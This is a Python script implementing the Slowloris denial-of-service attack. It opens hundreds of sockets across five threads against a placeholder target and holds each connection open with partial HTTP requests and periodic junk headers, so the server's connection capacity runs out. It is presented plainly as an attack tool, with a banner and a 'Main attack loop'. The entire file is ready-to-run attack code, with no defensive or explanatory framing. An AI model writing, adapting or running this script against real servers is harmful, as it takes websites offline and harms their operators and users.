import socket
import threading
import time
import random

# ASCII Art Header
ascii_art = """
CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@8@8@@@888OOOCooocccc::::
CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::
CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@@@8OOCOOOCoc::
CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::
CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc
ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
.......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
 Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client
"""

# Print the ASCII art at the start
print(ascii_art)

# Configuration
target = 'your.target.ip'  # Replace with the actual target IP or domain
port = 80                  # Target port (80 for HTTP)
num_sockets = 200           # Number of concurrent sockets to open
headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0) Gecko/20100101 Firefox/4.0",
    "Accept-language: en-US,en,q=0.5"
]

# Create a socket and connect to the server
def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode('utf-8'))

        for header in headers:
            s.send(f"{header}\r\n".encode('utf-8'))

        return s
    except socket.error:
        return None

# Send data periodically to keep the connection alive
def send_keep_alive(s):
    try:
        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
    except socket.error:
        return False
    return True

# Main attack loop
def attack():
    socket_list = []
    print(f"Attacking {target} on port {port} with {num_sockets} sockets.")

    # Create the initial sockets
    for _ in range(num_sockets):
        s = create_socket()
        if s:
            socket_list.append(s)

    while True:
        print(f"Sending keep-alive headers... Open sockets: {len(socket_list)}")
        for s in socket_list:
            if not send_keep_alive(s):
                socket_list.remove(s)
                s.close()

        # Add new sockets if any were closed
        for _ in range(num_sockets - len(socket_list)):
            s = create_socket()
            if s:
                socket_list.append(s)

        time.sleep(15)

# Start the attack using multiple threads
if __name__ == "__main__":
    try:
        for _ in range(5):  # Create 5 threads
            t = threading.Thread(target=attack)
            t.start()
    except KeyboardInterrupt:
        print("Attack stopped.")
